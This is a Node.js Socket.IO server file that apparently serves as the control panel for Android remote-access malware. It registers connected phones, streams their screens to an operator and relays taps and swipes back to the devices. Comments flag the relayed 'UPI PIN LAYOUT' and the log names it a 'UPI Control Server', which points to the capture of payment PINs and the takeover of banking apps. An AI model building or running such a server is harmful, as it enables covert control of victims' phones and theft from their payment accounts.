const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { 
        origin: "*", 
        methods: ["GET", "POST"],
        credentials: true 
    },
    pingTimeout: 30000,
    pingInterval: 10000,
    maxHttpBufferSize: 50 * 1024 * 1024, // 50MB frames
    transports: ['websocket']
});

app.use(compression());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

const devices = new Map();

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 🔥 PERFECT DEVICE MANAGEMENT
io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);
    
    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                lastSeen: Date.now()
            });
            socket.join(deviceId);
            broadcastDevices();
            console.log('📱 Device registered:', deviceId, deviceInfo.model);
        }
    });

    // 🔥 ULTRA LOW LATENCY SCREEN + LAYOUT
    socket.on('screen-frame', (frameData) => {
        const deviceId = frameData.deviceId;
        if (devices.has(deviceId)) {
            // Update last seen
            const device = devices.get(deviceId);
            device.lastSeen = Date.now();
            
            socket.to(deviceId).emit('screen-update', {
                deviceId,
                data: frameData.data,
                width: frameData.width,
                height: frameData.height,
                timestamp: frameData.timestamp,
                layout: frameData.layout, // 🔥 UPI PIN LAYOUT
                fps: frameData.fps
            });
        }
    });

    // 🔥 INSTANT CONTROL RELAY
    socket.on('control', (controlData) => {
        const { deviceId, action, x, y, startX, startY, endX, endY, duration } = controlData;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action,
                x: parseFloat(x || 0),
                y: parseFloat(y || 0),
                startX: parseFloat(startX || 0),
                startY: parseFloat(startY || 0),
                endX: parseFloat(endX || 0),
                endY: parseFloat(endY || 0),
                duration: parseInt(duration) || 300
            });
            console.log('🎮 Control sent:', action, 'to', deviceId);
        }
    });

    socket.on('ping', (cb) => {
        cb();
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
        // Mark devices offline
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                broadcastDevices();
                break;
            }
        }
    });
});

function broadcastDevices() {
    const activeDevices = Array.from(devices.entries()).map(([id, info]) => {
        // Auto cleanup old devices
        if (Date.now() - info.lastSeen > 60000) {
            devices.delete(id);
            return null;
        }
        return [id, info];
    }).filter(Boolean);
    
    io.emit('devices-update', activeDevices);
}

// 🔥 CLEANUP OLD DEVICES
setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (now - info.lastSeen > 120000) { // 2 min timeout
            devices.delete(deviceId);
        }
    }
    broadcastDevices();
}, 30000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 UPI Control Server LIVE on port ${PORT}`);
    console.log(`📱 Web Panel: http://localhost:${PORT}`);
});
